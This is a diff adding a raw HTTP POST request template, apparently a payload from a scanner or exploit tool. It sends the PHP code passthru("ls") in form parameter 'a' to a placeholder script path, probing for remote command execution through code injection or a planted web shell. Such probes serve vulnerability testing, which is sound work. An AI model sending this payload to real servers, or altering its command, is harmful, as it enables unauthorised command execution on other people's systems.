@@ -1,0 +1,6 @@
+POST {script_path} HTTP/1.1
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 27
+Connection: close
+
+a=passthru%28%22ls%22%29%3B
